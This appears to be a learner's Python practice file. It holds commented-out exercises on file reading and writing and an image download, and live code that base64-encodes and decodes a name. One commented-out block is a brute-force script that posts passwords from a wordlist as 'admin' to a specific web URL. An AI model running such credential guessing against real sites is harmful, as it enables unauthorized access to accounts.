# # name=input("ENTER NAME: ")
# # print(f"hello {name}")


# # try:
# #     f=open('data.csv')
# #     data=f.read().splitlines()
# #     del(data[0])
# #     for user in data:
# #         userinfo=user.split(',')
# #         print(userinfo)





# # except OSError as a:
# #     print(a.strerror)
# # finally:
# #     print("finally")    
# #     f.close()


# # def write2file(filePath,text):
# #     with open(filePath,'w') as f:
# #         f.write(text)


# # write2file('mytext.txt',"hello saeed")

# import requests

# url="https://soft98.ir/templates/23-09-12-13/images/logo.png"

# url2="https://wation.cloud/c/df88c473-0a0b-48ed-8a98-eca34c071acd?k=ZXlKcGRpSTZJa2RYTlhKck1HUk1jbVZMU0ZWQ01WTlZWVkUxZEVFOVBTSXNJblpoYkhWbElqb2lUMWhIVjIxRFNrRTFRVFV3WkdsV1QxVkZPRGtyVEd0M1JFRXhiWFZoYzBreVNWaGxjRVpSZFVoRU5GbEtXbk5XUWtWbFYwa3JXbUpXYUZCdVFrZ3hVRFpNYTFBclVqbE9hRkpyYlhGd01XZERRbGRRTkhWMVNucEhOSE0zVTBNNWVtRTBNMDVKZVdsVlEwTktUQzl2SzJnMU9HdEdkMkpzWTBwdGNucHBSbXBqYjJwWVpETkpaWFF6WjNaRVVVeHBabmxLYkVWNWRYZEpNbkJPU2psVlVuQldkVGwyTm1kSVpVb3ZUMVp1TTFKamVIbE1NMnhvWjFGU1NuRTFTME00WWs5NFF6RjRhVXBrUVZKMlMyVk1hRzFaWXk5TGIybElaR3R5ZFZsYVp5OHZiM05xUVdsR05uTlJiSE5EU1dSVVJtTklXa2hLYVU1QloyUm9Ua1pQY1NJc0ltMWhZeUk2SW1VeU9EZzNZVGN3WXpZME16ZGxPVEpoTldWbVlqRTRZak13WXpNek9ESXpNemhrTmpWaU0yTTBNV1ZsWWpVMVl6QTRaR0UwTTJFM05ETmtOekJpWkRnaUxDSjBZV2NpT2lJaWZRPT0"
# passlist_file=open('passlist.txt','r')
# passlist=passlist_file.read().splitlines();

# for password in passlist:
#     res =   requests.post(url2, data={"username":"admin","password":password})
#     if(res.status_code==200):
#         print("password is "+password)
#         break
#     else:
#         print("password is not "+password)



# # file=open("logo.png" ,'wb' )
# # file.write(res.content)
# # file.close()


# from mathh import summ

# getname()

import base64

text="saeeed leilyzadeh".encode()
print(text[::-1])

print(base64.b64encode(text).decode())


text2='c2FsYW0'
decoded=base64.b64decode(text2)
print(decoded)